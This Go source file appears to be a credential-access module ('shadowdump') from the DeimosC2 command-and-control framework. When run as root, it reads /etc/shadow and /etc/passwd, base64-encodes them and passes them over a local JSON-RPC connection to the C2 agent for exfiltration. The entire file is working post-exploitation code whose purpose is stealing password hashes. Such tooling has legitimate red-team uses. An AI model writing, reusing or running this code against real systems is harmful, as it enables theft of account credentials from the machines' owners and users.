package main

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"os"
	"syscall"
	"time"

	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
)

type downloadOutput struct {
	ShadowData string
	PassData   string
}

func runModule(port string) {
	//Hardcoded and needs to be fixed long term along with other modules
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("Dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	uid := syscall.Getuid()

	if uid == 0 {
		shadowData, err := ioutil.ReadFile("/etc/shadow")
		if err != nil {
			logging.Logger.Println("Couldn't read shadow file: ", err)
		}
		passData, err := ioutil.ReadFile("/etc/passwd")
		if err != nil {
			logging.Logger.Println("Couldn't read passwd file: ", err)
		}

		downloadStruct := downloadOutput{
			ShadowData: base64.StdEncoding.EncodeToString(shadowData),
			PassData:   base64.StdEncoding.EncodeToString(passData),
		}

		sendData, err := json.Marshal(downloadStruct)

		var reply int
		sendon := modulescommon.ModuleCom{"", true, false, false, "shadowdump", "credential_access", ".elf", sendData}
		err = client.Call("ModData.SendData", &sendon, &reply)
		if err != nil {
			log.Fatal("RPC error: ", err)
		}

		time.Sleep(3 * time.Second)

		sendon = modulescommon.ModuleCom{"", true, false, true, "shadowdump", "credential_access", ".elf", nil}

		err = client.Call("ModData.SendData", &sendon, &reply)
		if err != nil {
			log.Fatal("RPC error: ", err)
		}

	} else {
		logging.Logger.Println("Must run this as root in order for it to work!")
	}
}

func main() {
	runModule(os.Args[1])
}
